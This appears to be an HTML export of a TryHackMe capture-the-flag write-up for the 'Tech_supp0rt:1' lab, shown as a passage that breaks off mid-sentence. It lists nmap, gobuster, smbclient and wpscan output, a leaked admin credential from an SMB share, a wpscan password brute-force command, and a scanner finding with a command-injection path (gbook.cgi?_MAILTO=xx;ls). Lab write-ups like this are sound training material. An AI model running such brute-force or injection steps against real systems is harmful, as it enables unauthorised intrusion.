@@ -1,0 +1,832 @@
+<html><head><meta http-equiv="Content-Type" content="text/html; charset=utf-8"/><title>Tech_supp0rt:1</title><style>
+/* cspell:disable-file */
+/* webkit printing magic: print all background colors */
+html {
+	-webkit-print-color-adjust: exact;
+}
+* {
+	box-sizing: border-box;
+	-webkit-print-color-adjust: exact;
+}
+
+html,
+body {
+	margin: 0;
+	padding: 0;
+}
+@media only screen {
+	body {
+		margin: 2em auto;
+		max-width: 900px;
+		color: rgb(55, 53, 47);
+	}
+}
+
+body {
+	line-height: 1.5;
+	white-space: pre-wrap;
+}
+
+a,
+a.visited {
+	color: inherit;
+	text-decoration: underline;
+}
+
+.pdf-relative-link-path {
+	font-size: 80%;
+	color: #444;
+}
+
+h1,
+h2,
+h3 {
+	letter-spacing: -0.01em;
+	line-height: 1.2;
+	font-weight: 600;
+	margin-bottom: 0;
+}
+
+.page-title {
+	font-size: 2.5rem;
+	font-weight: 700;
+	margin-top: 0;
+	margin-bottom: 0.75em;
+}
+
+h1 {
+	font-size: 1.875rem;
+	margin-top: 1.875rem;
+}
+
+h2 {
+	font-size: 1.5rem;
+	margin-top: 1.5rem;
+}
+
+h3 {
+	font-size: 1.25rem;
+	margin-top: 1.25rem;
+}
+
+.source {
+	border: 1px solid #ddd;
+	border-radius: 3px;
+	padding: 1.5em;
+	word-break: break-all;
+}
+
+.callout {
+	border-radius: 3px;
+	padding: 1rem;
+}
+
+figure {
+	margin: 1.25em 0;
+	page-break-inside: avoid;
+}
+
+figcaption {
+	opacity: 0.5;
+	font-size: 85%;
+	margin-top: 0.5em;
+}
+
+mark {
+	background-color: transparent;
+}
+
+.indented {
+	padding-left: 1.5em;
+}
+
+hr {
+	background: transparent;
+	display: block;
+	width: 100%;
+	height: 1px;
+	visibility: visible;
+	border: none;
+	border-bottom: 1px solid rgba(55, 53, 47, 0.09);
+}
+
+img {
+	max-width: 100%;
+}
+
+@media only print {
+	img {
+		max-height: 100vh;
+		object-fit: contain;
+	}
+}
+
+@page {
+	margin: 1in;
+}
+
+.collection-content {
+	font-size: 0.875rem;
+}
+
+.column-list {
+	display: flex;
+	justify-content: space-between;
+}
+
+.column {
+	padding: 0 1em;
+}
+
+.column:first-child {
+	padding-left: 0;
+}
+
+.column:last-child {
+	padding-right: 0;
+}
+
+.table_of_contents-item {
+	display: block;
+	font-size: 0.875rem;
+	line-height: 1.3;
+	padding: 0.125rem;
+}
+
+.table_of_contents-indent-1 {
+	margin-left: 1.5rem;
+}
+
+.table_of_contents-indent-2 {
+	margin-left: 3rem;
+}
+
+.table_of_contents-indent-3 {
+	margin-left: 4.5rem;
+}
+
+.table_of_contents-link {
+	text-decoration: none;
+	opacity: 0.7;
+	border-bottom: 1px solid rgba(55, 53, 47, 0.18);
+}
+
+table,
+th,
+td {
+	border: 1px solid rgba(55, 53, 47, 0.09);
+	border-collapse: collapse;
+}
+
+table {
+	border-left: none;
+	border-right: none;
+}
+
+th,
+td {
+	font-weight: normal;
+	padding: 0.25em 0.5em;
+	line-height: 1.5;
+	min-height: 1.5em;
+	text-align: left;
+}
+
+th {
+	color: rgba(55, 53, 47, 0.6);
+}
+
+ol,
+ul {
+	margin: 0;
+	margin-block-start: 0.6em;
+	margin-block-end: 0.6em;
+}
+
+li > ol:first-child,
+li > ul:first-child {
+	margin-block-start: 0.6em;
+}
+
+ul > li {
+	list-style: disc;
+}
+
+ul.to-do-list {
+	padding-inline-start: 0;
+}
+
+ul.to-do-list > li {
+	list-style: none;
+}
+
+.to-do-children-checked {
+	text-decoration: line-through;
+	opacity: 0.375;
+}
+
+ul.toggle > li {
+	list-style: none;
+}
+
+ul {
+	padding-inline-start: 1.7em;
+}
+
+ul > li {
+	padding-left: 0.1em;
+}
+
+ol {
+	padding-inline-start: 1.6em;
+}
+
+ol > li {
+	padding-left: 0.2em;
+}
+
+.mono ol {
+	padding-inline-start: 2em;
+}
+
+.mono ol > li {
+	text-indent: -0.4em;
+}
+
+.toggle {
+	padding-inline-start: 0em;
+	list-style-type: none;
+}
+
+/* Indent toggle children */
+.toggle > li > details {
+	padding-left: 1.7em;
+}
+
+.toggle > li > details > summary {
+	margin-left: -1.1em;
+}
+
+.selected-value {
+	display: inline-block;
+	padding: 0 0.5em;
+	background: rgba(206, 205, 202, 0.5);
+	border-radius: 3px;
+	margin-right: 0.5em;
+	margin-top: 0.3em;
+	margin-bottom: 0.3em;
+	white-space: nowrap;
+}
+
+.collection-title {
+	display: inline-block;
+	margin-right: 1em;
+}
+
+.page-description {
+    margin-bottom: 2em;
+}
+
+.simple-table {
+	margin-top: 1em;
+	font-size: 0.875rem;
+	empty-cells: show;
+}
+.simple-table td {
+	height: 29px;
+	min-width: 120px;
+}
+
+.simple-table th {
+	height: 29px;
+	min-width: 120px;
+}
+
+.simple-table-header-color {
+	background: rgb(247, 246, 243);
+	color: black;
+}
+.simple-table-header {
+	font-weight: 500;
+}
+
+time {
+	opacity: 0.5;
+}
+
+.icon {
+	display: inline-block;
+	max-width: 1.2em;
+	max-height: 1.2em;
+	text-decoration: none;
+	vertical-align: text-bottom;
+	margin-right: 0.5em;
+}
+
+img.icon {
+	border-radius: 3px;
+}
+
+.user-icon {
+	width: 1.5em;
+	height: 1.5em;
+	border-radius: 100%;
+	margin-right: 0.5rem;
+}
+
+.user-icon-inner {
+	font-size: 0.8em;
+}
+
+.text-icon {
+	border: 1px solid #000;
+	text-align: center;
+}
+
+.page-cover-image {
+	display: block;
+	object-fit: cover;
+	width: 100%;
+	max-height: 30vh;
+}
+
+.page-header-icon {
+	font-size: 3rem;
+	margin-bottom: 1rem;
+}
+
+.page-header-icon-with-cover {
+	margin-top: -0.72em;
+	margin-left: 0.07em;
+}
+
+.page-header-icon img {
+	border-radius: 3px;
+}
+
+.link-to-page {
+	margin: 1em 0;
+	padding: 0;
+	border: none;
+	font-weight: 500;
+}
+
+p > .user {
+	opacity: 0.5;
+}
+
+td > .user,
+td > time {
+	white-space: nowrap;
+}
+
+input[type="checkbox"] {
+	transform: scale(1.5);
+	margin-right: 0.6em;
+	vertical-align: middle;
+}
+
+p {
+	margin-top: 0.5em;
+	margin-bottom: 0.5em;
+}
+
+.image {
+	border: none;
+	margin: 1.5em 0;
+	padding: 0;
+	border-radius: 0;
+	text-align: center;
+}
+
+.code,
+code {
+	background: rgba(135, 131, 120, 0.15);
+	border-radius: 3px;
+	padding: 0.2em 0.4em;
+	border-radius: 3px;
+	font-size: 85%;
+	tab-size: 2;
+}
+
+code {
+	color: #eb5757;
+}
+
+.code {
+	padding: 1.5em 1em;
+}
+
+.code-wrap {
+	white-space: pre-wrap;
+	word-break: break-all;
+}
+
+.code > code {
+	background: none;
+	padding: 0;
+	font-size: 100%;
+	color: inherit;
+}
+
+blockquote {
+	font-size: 1.25em;
+	margin: 1em 0;
+	padding-left: 1em;
+	border-left: 3px solid rgb(55, 53, 47);
+}
+
+.bookmark {
+	text-decoration: none;
+	max-height: 8em;
+	padding: 0;
+	display: flex;
+	width: 100%;
+	align-items: stretch;
+}
+
+.bookmark-title {
+	font-size: 0.85em;
+	overflow: hidden;
+	text-overflow: ellipsis;
+	height: 1.75em;
+	white-space: nowrap;
+}
+
+.bookmark-text {
+	display: flex;
+	flex-direction: column;
+}
+
+.bookmark-info {
+	flex: 4 1 180px;
+	padding: 12px 14px 14px;
+	display: flex;
+	flex-direction: column;
+	justify-content: space-between;
+}
+
+.bookmark-image {
+	width: 33%;
+	flex: 1 1 180px;
+	display: block;
+	position: relative;
+	object-fit: cover;
+	border-radius: 1px;
+}
+
+.bookmark-description {
+	color: rgba(55, 53, 47, 0.6);
+	font-size: 0.75em;
+	overflow: hidden;
+	max-height: 4.5em;
+	word-break: break-word;
+}
+
+.bookmark-href {
+	font-size: 0.75em;
+	margin-top: 0.25em;
+}
+
+.sans { font-family: ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI", Helvetica, "Apple Color Emoji", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol"; }
+.code { font-family: "SFMono-Regular", Menlo, Consolas, "PT Mono", "Liberation Mono", Courier, monospace; }
+.serif { font-family: Lyon-Text, Georgia, ui-serif, serif; }
+.mono { font-family: iawriter-mono, Nitti, Menlo, Courier, monospace; }
+.pdf .sans { font-family: Inter, ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI", Helvetica, "Apple Color Emoji", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol", 'Twemoji', 'Noto Color Emoji', 'Noto Sans CJK JP'; }
+.pdf:lang(zh-CN) .sans { font-family: Inter, ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI", Helvetica, "Apple Color Emoji", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol", 'Twemoji', 'Noto Color Emoji', 'Noto Sans CJK SC'; }
+.pdf:lang(zh-TW) .sans { font-family: Inter, ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI", Helvetica, "Apple Color Emoji", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol", 'Twemoji', 'Noto Color Emoji', 'Noto Sans CJK TC'; }
+.pdf:lang(ko-KR) .sans { font-family: Inter, ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI", Helvetica, "Apple Color Emoji", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol", 'Twemoji', 'Noto Color Emoji', 'Noto Sans CJK KR'; }
+.pdf .code { font-family: Source Code Pro, "SFMono-Regular", Menlo, Consolas, "PT Mono", "Liberation Mono", Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK JP'; }
+.pdf:lang(zh-CN) .code { font-family: Source Code Pro, "SFMono-Regular", Menlo, Consolas, "PT Mono", "Liberation Mono", Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK SC'; }
+.pdf:lang(zh-TW) .code { font-family: Source Code Pro, "SFMono-Regular", Menlo, Consolas, "PT Mono", "Liberation Mono", Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK TC'; }
+.pdf:lang(ko-KR) .code { font-family: Source Code Pro, "SFMono-Regular", Menlo, Consolas, "PT Mono", "Liberation Mono", Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK KR'; }
+.pdf .serif { font-family: PT Serif, Lyon-Text, Georgia, ui-serif, serif, 'Twemoji', 'Noto Color Emoji', 'Noto Serif CJK JP'; }
+.pdf:lang(zh-CN) .serif { font-family: PT Serif, Lyon-Text, Georgia, ui-serif, serif, 'Twemoji', 'Noto Color Emoji', 'Noto Serif CJK SC'; }
+.pdf:lang(zh-TW) .serif { font-family: PT Serif, Lyon-Text, Georgia, ui-serif, serif, 'Twemoji', 'Noto Color Emoji', 'Noto Serif CJK TC'; }
+.pdf:lang(ko-KR) .serif { font-family: PT Serif, Lyon-Text, Georgia, ui-serif, serif, 'Twemoji', 'Noto Color Emoji', 'Noto Serif CJK KR'; }
+.pdf .mono { font-family: PT Mono, iawriter-mono, Nitti, Menlo, Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK JP'; }
+.pdf:lang(zh-CN) .mono { font-family: PT Mono, iawriter-mono, Nitti, Menlo, Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK SC'; }
+.pdf:lang(zh-TW) .mono { font-family: PT Mono, iawriter-mono, Nitti, Menlo, Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK TC'; }
+.pdf:lang(ko-KR) .mono { font-family: PT Mono, iawriter-mono, Nitti, Menlo, Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK KR'; }
+.highlight-default {
+	color: rgba(55, 53, 47, 1);
+}
+.highlight-gray {
+	color: rgba(120, 119, 116, 1);
+	fill: rgba(120, 119, 116, 1);
+}
+.highlight-brown {
+	color: rgba(159, 107, 83, 1);
+	fill: rgba(159, 107, 83, 1);
+}
+.highlight-orange {
+	color: rgba(217, 115, 13, 1);
+	fill: rgba(217, 115, 13, 1);
+}
+.highlight-yellow {
+	color: rgba(203, 145, 47, 1);
+	fill: rgba(203, 145, 47, 1);
+}
+.highlight-teal {
+	color: rgba(68, 131, 97, 1);
+	fill: rgba(68, 131, 97, 1);
+}
+.highlight-blue {
+	color: rgba(51, 126, 169, 1);
+	fill: rgba(51, 126, 169, 1);
+}
+.highlight-purple {
+	color: rgba(144, 101, 176, 1);
+	fill: rgba(144, 101, 176, 1);
+}
+.highlight-pink {
+	color: rgba(193, 76, 138, 1);
+	fill: rgba(193, 76, 138, 1);
+}
+.highlight-red {
+	color: rgba(212, 76, 71, 1);
+	fill: rgba(212, 76, 71, 1);
+}
+.highlight-gray_background {
+	background: rgba(241, 241, 239, 1);
+}
+.highlight-brown_background {
+	background: rgba(244, 238, 238, 1);
+}
+.highlight-orange_background {
+	background: rgba(251, 236, 221, 1);
+}
+.highlight-yellow_background {
+	background: rgba(251, 243, 219, 1);
+}
+.highlight-teal_background {
+	background: rgba(237, 243, 236, 1);
+}
+.highlight-blue_background {
+	background: rgba(231, 243, 248, 1);
+}
+.highlight-purple_background {
+	background: rgba(244, 240, 247, 0.8);
+}
+.highlight-pink_background {
+	background: rgba(249, 238, 243, 0.8);
+}
+.highlight-red_background {
+	background: rgba(253, 235, 236, 1);
+}
+.block-color-default {
+	color: inherit;
+	fill: inherit;
+}
+.block-color-gray {
+	color: rgba(120, 119, 116, 1);
+	fill: rgba(120, 119, 116, 1);
+}
+.block-color-brown {
+	color: rgba(159, 107, 83, 1);
+	fill: rgba(159, 107, 83, 1);
+}
+.block-color-orange {
+	color: rgba(217, 115, 13, 1);
+	fill: rgba(217, 115, 13, 1);
+}
+.block-color-yellow {
+	color: rgba(203, 145, 47, 1);
+	fill: rgba(203, 145, 47, 1);
+}
+.block-color-teal {
+	color: rgba(68, 131, 97, 1);
+	fill: rgba(68, 131, 97, 1);
+}
+.block-color-blue {
+	color: rgba(51, 126, 169, 1);
+	fill: rgba(51, 126, 169, 1);
+}
+.block-color-purple {
+	color: rgba(144, 101, 176, 1);
+	fill: rgba(144, 101, 176, 1);
+}
+.block-color-pink {
+	color: rgba(193, 76, 138, 1);
+	fill: rgba(193, 76, 138, 1);
+}
+.block-color-red {
+	color: rgba(212, 76, 71, 1);
+	fill: rgba(212, 76, 71, 1);
+}
+.block-color-gray_background {
+	background: rgba(241, 241, 239, 1);
+}
+.block-color-brown_background {
+	background: rgba(244, 238, 238, 1);
+}
+.block-color-orange_background {
+	background: rgba(251, 236, 221, 1);
+}
+.block-color-yellow_background {
+	background: rgba(251, 243, 219, 1);
+}
+.block-color-teal_background {
+	background: rgba(237, 243, 236, 1);
+}
+.block-color-blue_background {
+	background: rgba(231, 243, 248, 1);
+}
+.block-color-purple_background {
+	background: rgba(244, 240, 247, 0.8);
+}
+.block-color-pink_background {
+	background: rgba(249, 238, 243, 0.8);
+}
+.block-color-red_background {
+	background: rgba(253, 235, 236, 1);
+}
+.select-value-color-interactiveBlue { background-color: rgba(35, 131, 226, .07); }
+.select-value-color-pink { background-color: rgba(245, 224, 233, 1); }
+.select-value-color-purple { background-color: rgba(232, 222, 238, 1); }
+.select-value-color-green { background-color: rgba(219, 237, 219, 1); }
+.select-value-color-gray { background-color: rgba(227, 226, 224, 1); }
+.select-value-color-translucentGray { background-color: rgba(255, 255, 255, 0.0375); }
+.select-value-color-orange { background-color: rgba(250, 222, 201, 1); }
+.select-value-color-brown { background-color: rgba(238, 224, 218, 1); }
+.select-value-color-red { background-color: rgba(255, 226, 221, 1); }
+.select-value-color-yellow { background-color: rgba(253, 236, 200, 1); }
+.select-value-color-blue { background-color: rgba(211, 229, 239, 1); }
+.select-value-color-pageGlass { background-color: undefined; }
+.select-value-color-washGlass { background-color: undefined; }
+
+.checkbox {
+	display: inline-flex;
+	vertical-align: text-bottom;
+	width: 16;
+	height: 16;
+	background-size: 16px;
+	margin-left: 2px;
+	margin-right: 5px;
+}
+
+.checkbox-on {
+	background-image: url("data:image/svg+xml;charset=UTF-8,%3Csvg%20width%3D%2216%22%20height%3D%2216%22%20viewBox%3D%220%200%2016%2016%22%20fill%3D%22none%22%20xmlns%3D%22http%3A%2F%2Fwww.w3.org%2F2000%2Fsvg%22%3E%0A%3Crect%20width%3D%2216%22%20height%3D%2216%22%20fill%3D%22%2358A9D7%22%2F%3E%0A%3Cpath%20d%3D%22M6.71429%2012.2852L14%204.9995L12.7143%203.71436L6.71429%209.71378L3.28571%206.2831L2%207.57092L6.71429%2012.2852Z%22%20fill%3D%22white%22%2F%3E%0A%3C%2Fsvg%3E");
+}
+
+.checkbox-off {
+	background-image: url("data:image/svg+xml;charset=UTF-8,%3Csvg%20width%3D%2216%22%20height%3D%2216%22%20viewBox%3D%220%200%2016%2016%22%20fill%3D%22none%22%20xmlns%3D%22http%3A%2F%2Fwww.w3.org%2F2000%2Fsvg%22%3E%0A%3Crect%20x%3D%220.75%22%20y%3D%220.75%22%20width%3D%2214.5%22%20height%3D%2214.5%22%20fill%3D%22white%22%20stroke%3D%22%2336352F%22%20stroke-width%3D%221.5%22%2F%3E%0A%3C%2Fsvg%3E");
+}
+	
+</style></head><body><article id="f94b7c2e-d893-4fd0-beaa-612599752778" class="page sans"><header><div class="page-header-icon undefined"><img class="icon" src="https://tryhackme-images.s3.amazonaws.com/room-icons/4128774917fae71184e79acab2007e93.png"/></div><h1 class="page-title">Tech_supp0rt:1</h1><p class="page-description"></p></header><div class="page-body"><p id="e8dc57ba-7623-4ae6-ac7c-ca11a9a25fff" class="">Write-Ups by : Squad</p><h2 id="04aaecdf-9523-4b05-9e30-797ea35ae556" class="">Information Gathering</h2><p id="d11a8bf6-d154-4d9d-a04d-7f2986878004" class="">Nmap Scan </p><pre id="ba2d0c47-1b78-407c-a921-74718f8ac486" class="code code-wrap"><code>└──╼ $nmap -T4 -A 10.10.238.133
+Starting Nmap 7.93 ( https://nmap.org ) at 2023-05-29 18:04 CST
+Nmap scan report for 10.10.238.133
+Host is up (0.21s latency).
+Not shown: 996 closed tcp ports (conn-refused)
+PORT    STATE SERVICE     VERSION
+22/tcp  open  ssh         OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   2048 108af572d7f97e14a5c54f9e978b3d58 (RSA)
+|   256 7f10f557413c71dbb55bdb75c976305c (ECDSA)
+|_  256 6b4c23506f36007ca67c1173c1a8600c (ED25519)
+80/tcp  open  http        Apache httpd 2.4.18 ((Ubuntu))
+|_http-title: Apache2 Ubuntu Default Page: It works
+|_http-server-header: Apache/2.4.18 (Ubuntu)
+139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
+445/tcp open  netbios-ssn Samba smbd 4.3.11-Ubuntu (workgroup: WORKGROUP)
+Service Info: Host: TECHSUPPORT; OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Host script results:
+| smb-security-mode: 
+|   account_used: guest
+|   authentication_level: user
+|   challenge_response: supported
+|_  message_signing: disabled (dangerous, but default)
+| smb2-security-mode: 
+|   311: 
+|_    Message signing enabled but not required
+| smb-os-discovery: 
+|   OS: Windows 6.1 (Samba 4.3.11-Ubuntu)
+|   Computer name: techsupport
+|   NetBIOS computer name: TECHSUPPORT\x00
+|   Domain name: \x00
+|   FQDN: techsupport
+|_  System time: 2023-05-29T15:34:26+05:30
+| smb2-time: 
+|   date: 2023-05-29T10:04:28
+|_  start_date: N/A
+|_clock-skew: mean: -1h49m58s, deviation: 3h10m31s, median: 0s
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 27.79 seconds</code></pre><p id="dd1df033-a69b-471d-aed8-ddc83f71461c" class="">
+</p><p id="9a99d422-552e-4f97-b089-40de31504b14" class="">Directories from gobuster</p><pre id="009274a5-2f42-4de8-980d-15fc6aa3bad0" class="code"><code>/wordpress
+/wordpress/wp-content           (Status: 301) [Size: 327] [--&gt; http://10.10.110.88/wordpress/wp-content/]
+/wordpress/wp-includes          (Status: 301) [Size: 328] [--&gt; http://10.10.110.88/wordpress/wp-includes/]
+/wordpress/wp-admin             (Status: 301) [Size: 325] [--&gt; http://10.10.110.88/wordpress/wp-admin/]</code></pre><p id="f79075a0-90de-415e-989f-ea6a4e5065da" class="">
+</p><p id="e0f128af-6ee3-42a5-af92-aa7241369e42" class="">SMB <code>smbclient \\\\10.10.110.88\\websvr</code></p><p id="bc04ae0a-efb5-48e3-9844-502e2abc2320" class="">
+</p><p id="addb853f-3761-47c2-bd08-4d38c6a39f1b" class="">
+</p><pre id="ca01b253-8466-44e7-acce-32b02761f34b" class="code"><code>GOALS
+=====
+1)Make fake popup and host it online on Digital Ocean server
+2)Fix subrion site, /subrion doesn&#x27;t work, edit from panel
+3)Edit wordpress website
+
+IMP
+===
+Subrion creds
+|-&gt;admin:7sKvntXdPEJaxazce9PXi24zaFrLiKWCk [cooked with magical formula]
+Wordpress creds
+|-&gt;</code></pre><p id="26d60171-1786-4cd8-bfaa-761bc73c9000" class="">
+</p><p id="3c29219d-8287-473a-8097-11c9b5b6d3ba" class="">WPSCAN</p><pre id="8b81ffd6-c9ec-4cfd-bc34-e7eb77dfb2b1" class="code"><code>WordPress version 5.7.2 identified (Insecure, released on 2021-05-12).</code></pre><pre id="5576a2b8-07e5-4e5d-8bbf-59d38cc18315" class="code"><code>Interesting Finding(s):
+
+[+] Headers
+ | Interesting Entry: Server: Apache/2.4.18 (Ubuntu)
+ | Found By: Headers (Passive Detection)
+ | Confidence: 100%
+
+[+] XML-RPC seems to be enabled: http://10.10.110.88/wordpress/xmlrpc.php
+ | Found By: Direct Access (Aggressive Detection)
+ | Confidence: 100%
+ | References:
+ |  - http://codex.wordpress.org/XML-RPC_Pingback_API
+ |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/
+ |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/
+ |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/
+ |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/
+
+[+] WordPress readme found: http://10.10.110.88/wordpress/readme.html
+ | Found By: Direct Access (Aggressive Detection)
+ | Confidence: 100%
+
+[+] Upload directory has listing enabled: http://10.10.110.88/wordpress/wp-content/uploads/
+ | Found By: Direct Access (Aggressive Detection)
+ | Confidence: 100%
+
+[+] The external WP-Cron seems to be enabled: http://10.10.110.88/wordpress/wp-cron.php
+ | Found By: Direct Access (Aggressive Detection)
+ | Confidence: 60%
+ | References:
+ |  - https://www.iplocation.net/defend-wordpress-from-ddos
+ |  - https://github.com/wpscanteam/wpscan/issues/1299
+
+[+] WordPress version 5.7.2 identified (Insecure, released on 2021-05-12).
+ | Found By: Emoji Settings (Passive Detection)
+ |  - http://10.10.110.88/wordpress/, Match: &#x27;wp-includes\/js\/wp-emoji-release.min.js?ver=5.7.2&#x27;
+ | Confirmed By: Meta Generator (Passive Detection)
+ |  - http://10.10.110.88/wordpress/, Match: &#x27;WordPress 5.7.2&#x27;
+
+[+] WordPress theme in use: teczilla
+ | Location: http://10.10.110.88/wordpress/wp-content/themes/teczilla/
+ | Last Updated: 2022-08-09T00:00:00.000Z
+ | Readme: http://10.10.110.88/wordpress/wp-content/themes/teczilla/readme.txt
+ | [!] The version is out of date, the latest version is 1.1.4
+ | Style URL: http://10.10.110.88/wordpress/wp-content/themes/teczilla/style.css?ver=5.7.2
+ | Style Name: Teczilla
+ | Style URI: https://www.avadantathemes.com/product/teczilla-free/
+ | Description: Teczilla is a creative, fully customizable and multipurpose theme that you can use to create any kin...
+ | Author: avadantathemes
+ | Author URI: https://www.avadantathemes.com/
+ |
+ | Found By: Css Style In Homepage (Passive Detection)
+ |
+ | Version: 1.0.4 (80% confidence)
+ | Found By: Style (Passive Detection)
+ |  - http://10.10.110.88/wordpress/wp-content/themes/teczilla/style.css?ver=5.7.2, Match: &#x27;Version: 1.0.4&#x27;</code></pre><p id="2e28c1c1-5817-4dcc-a1da-891edf0037f1" class="">
+</p><p id="7194a21a-21b0-4e96-b044-558a552b8b53" class="">Bruteforce login page</p><pre id="3a306384-fbae-42ea-8e80-e208e72beaae" class="code"><code>wpscan --url 10.10.110.88/wordpress/ -U support -P /usr/share/wordlists/rockyou.txt --password-attack wp-login</code></pre><p id="b1422080-e4f9-47b7-a264-57f6930f0926" class="">
+</p><p id="3bce007b-29ec-448d-bf5a-b36fb60a7f91" class="">BASE58</p><p id="47fd3585-abe0-46e2-845e-3a5247266bb9" class="">
+</p><ul id="949cd2a1-922a-4c3e-9f3b-4a65567bc289" class="bulleted-list"><li style="list-style-type:disc">RFC-1918 /subrion/: IP address found in the &#x27;location&#x27; header. The IP is &quot;10.0.2.15&quot;. See: <a href="https://portswigger.net/kb/issues/00600300_private-ip-addresses-disclosed">https://portswigger.net/kb/issues/00600300_private-ip-addresses-disclosed</a></li></ul><ul id="6462d868-89f3-4422-b6be-6f1df823311d" class="bulleted-list"><li style="list-style-type:disc">/subrion/: The anti-clickjacking X-Frame-Options header is not present. See: <a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Frame-Options">https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Frame-Options</a></li></ul><ul id="3058ab52-e9b5-47a9-8f2e-83e9a411776c" class="bulleted-list"><li style="list-style-type:disc">/subrion/: The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type. See: <a href="https://www.netsparker.com/web-vulnerability-scanner/vulnerabilities/missing-content-type-header/">https://www.netsparker.com/web-vulnerability-scanner/vulnerabilities/missing-content-type-header/</a></li></ul><ul id="b02c04a0-5d03-4a09-a1f4-24346de123f2" class="bulleted-list"><li style="list-style-type:disc">/subrion/: Cookie INTELLI_06c8042c3d created without the httponly flag. See: <a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Cookies">https://developer.mozilla.org/en-US/docs/Web/HTTP/Cookies</a></li></ul><ul id="ce9d61e9-1c44-4ab0-8b9b-bb2f47d76d01" class="bulleted-list"><li style="list-style-type:disc">Root page /subrion redirects to: <a href="http://10.0.2.15/subrion/subrion/">http://10.0.2.15/subrion/subrion/</a></li></ul><ul id="ef41e79a-8982-48f8-bbdf-b8abb10f6bfb" class="bulleted-list"><li style="list-style-type:disc">All CGI directories &#x27;found&#x27;, use &#x27;-C none&#x27; to test none</li></ul><ul id="0ad70c7f-a89c-4ce2-a203-1a1a04d7d208" class="bulleted-list"><li style="list-style-type:disc">/robots.txt: Entry &#x27;/install/&#x27; is returned a non-forbidden or redirect HTTP code (200). See: <a href="https://portswigger.net/kb/issues/00600600_robots-txt-file">https://portswigger.net/kb/issues/00600600_robots-txt-file</a></li></ul><ul id="89e4c8a0-37f1-491d-876e-fc3a7e8c01ed" class="bulleted-list"><li style="list-style-type:disc">/robots.txt: Entry &#x27;/panel/&#x27; is returned a non-forbidden or redirect HTTP code (200). See: <a href="https://portswigger.net/kb/issues/00600600_robots-txt-file">https://portswigger.net/kb/issues/00600600_robots-txt-file</a></li></ul><ul id="49a42091-8dcb-4fca-9550-9082efda888a" class="bulleted-list"><li style="list-style-type:disc">/robots.txt: contains 7 entries which should be manually viewed. See: <a href="https://developer.mozilla.org/en-US/docs/Glossary/Robots.txt">https://developer.mozilla.org/en-US/docs/Glossary/Robots.txt</a></li></ul><ul id="2e60e7f3-41bd-4b18-8bad-391ee52bd215" class="bulleted-list"><li style="list-style-type:disc">/: The web server may reveal its internal or real IP in the Location header via a request to with HTTP/1.0. The value is &quot;10.0.2.15&quot;. See: <a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2000-0649">http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2000-0649</a></li></ul><ul id="559d1419-2ac2-4211-87d5-a2f4b2c7f6a0" class="bulleted-list"><li style="list-style-type:disc">Apache/2.4.18 appears to be outdated (current is at least Apache/2.4.54). Apache 2.2.34 is the EOL for the 2.x branch.</li></ul><ul id="f13aff1f-95c9-4c60-b465-c4dc1797881e" class="bulleted-list"><li style="list-style-type:disc">OPTIONS: Allowed HTTP Methods: POST, OPTIONS, GET, HEAD .</li></ul><ul id="4e9a75e8-11de-4a79-85e9-b406f7392786" class="bulleted-list"><li style="list-style-type:disc">/subrion/sitemap.xml: This gives a nice listing of the site content.</li></ul><ul id="174a090a-636d-4795-826b-a13bd46adfc8" class="bulleted-list"><li style="list-style-type:disc">/subrion/cgi-win/gbook/gbook.cgi?_MAILTO=xx;ls: gbook.cgi allows command execution. See: <a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2000-1131">http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2000-1131</a></li></ul><ul id="96ef5121-1526-4331-8f3d-db3faa705613" class="bulleted-list"><li style="list-style-type:disc">RFC-1918 /subrion/: IP address found in the &#x27;location&#x27; header. The IP is &quot;10.0.2.15&quot;. See: <a href="https://portswigger.net/kb/issues/00600300_private-ip-addresses-disclosed">https://portswigger.net/kb/issues/00600300_private-ip-addresses-disclosed</a></li></ul><ul id="0c6d956b-dfe3-408d-9b29-c2caa29924c1" class="bulleted-list"><li style="list-style-type:disc">/subrion/: The anti-clickjacking X-Frame-Options header is not present. See: <a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Frame-Options">https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Frame-Options</a></li></ul><ul id="34df2642-11cd-474c-8089-79411d310af6" class="bulleted-list"><li style="list-style-type:disc">/subrion/: The X-Content-Type-Options header is not set. This could allow the user 